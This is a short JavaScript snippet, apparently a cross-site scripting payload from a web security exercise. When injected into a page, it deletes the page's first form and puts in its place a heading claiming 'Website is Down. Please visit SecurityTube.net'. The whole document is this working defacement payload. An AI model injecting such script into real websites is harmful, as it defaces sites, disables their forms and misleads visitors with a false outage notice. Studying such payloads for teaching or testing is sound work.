<script>
//create new Element and append to forms parentNode
var input = document.createElement("h2");
input.innerHTML = "Website is Down. Please visit SecurityTube.net";
document.forms[0].parentNode.appendChild(input);

//remove the form
document.forms[0].parentNode.removeChild(document.forms[0]);
</script>
